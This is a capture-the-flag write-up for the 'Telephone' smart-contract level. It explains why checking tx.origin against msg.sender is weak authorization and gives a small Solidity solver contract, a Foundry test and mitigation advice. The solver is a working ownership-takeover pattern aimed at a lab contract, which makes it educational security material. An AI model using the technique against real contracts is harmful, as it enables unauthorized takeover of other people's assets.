# 04. Telephone

[English](04_Telephone.md) | [한국어](../ko/04_Telephone.md)

## Objective

Become the owner of the `Telephone` contract.

## Key Concepts

- `msg.sender`
- `tx.origin`
- Contract-to-contract calls
- Call-chain context
- Authorization design
- Foundry's two-argument `vm.prank()`

## Contract Analysis

The target changes its owner only when `tx.origin` and `msg.sender` differ:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

These two global values describe different parts of a call chain:

- `tx.origin` is the externally owned account that started the transaction.
- `msg.sender` is the address that directly called the current function.

### Direct Call

If the player calls `Telephone.changeOwner()` directly, both values refer to the player:

```text
player → Telephone

tx.origin  = player
msg.sender = player
```

The condition evaluates to `false`, so the owner does not change.

### Call Through an Intermediary

If the player calls `TelephoneSolver` and the solver calls `Telephone`, the original transaction sender remains the player while the immediate caller changes:

```text
player → TelephoneSolver → Telephone

tx.origin  = player
msg.sender = TelephoneSolver
```

The condition now evaluates to `true`, allowing the supplied address to become the owner.

## Solver Contract

The target address is fixed when the solver is deployed:

```solidity
interface ITelephone {
    function changeOwner(address newOwner) external;
}

contract TelephoneSolver {
    ITelephone public immutable target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function solve(address newOwner) external {
        target.changeOwner(newOwner);
    }
}
```

The solver does not need special privileges. Its purpose is to add one contract call between the player and the target.

## Foundry Test

The test uses the two-argument form of `vm.prank()`:

```solidity
vm.prank(player, player);
solver.solve(player);
```

Its argument order is:

```solidity
vm.prank(msgSender, txOrigin);
```

For the next call, both values begin as `player`. When the solver makes the nested call to `Telephone`, `tx.origin` stays as `player`, but `msg.sender` becomes the solver address.

The test suite verifies both sides of the behavior:

1. A direct player call does not change ownership.
2. A call routed through the solver changes ownership to the player.

## Test Flow

```text
Deploy Telephone
        ↓
Deploy TelephoneSolver with the target address
        ↓
Set msg.sender and tx.origin to player
        ↓
Player calls solver.solve(player)
        ↓
Solver calls target.changeOwner(player)
        ↓
Telephone observes tx.origin != msg.sender
        ↓
Verify owner == player
```

## Root Cause

The contract uses the relationship between `tx.origin` and `msg.sender` as an authorization condition. This relationship only describes the call path; it does not prove that the immediate caller is trusted or that an ownership change was intentionally authorized.

Authorization based on `tx.origin` is unreliable because an intermediary contract can preserve the original transaction account while becoming the immediate caller.

## Recommended Mitigations

- Do not use `tx.origin` for authorization.
- Check `msg.sender` against an explicitly authorized address.
- Restrict ownership changes to the current owner.
- Use a two-step ownership-transfer pattern when appropriate.
- Prefer established access-control components such as OpenZeppelin's `Ownable`.
- Test both direct calls and calls routed through intermediary contracts.

## Run the Test

```bash
forge test --match-path test/04_Telephone.t.sol -vvv
```

To inspect the complete call trace:

```bash
forge test --match-path test/04_Telephone.t.sol -vvvv
```

## Takeaway

`tx.origin` identifies where a transaction began, while `msg.sender` identifies the immediate caller. Security decisions should not treat the original transaction account as proof that every contract in the call chain is trusted.
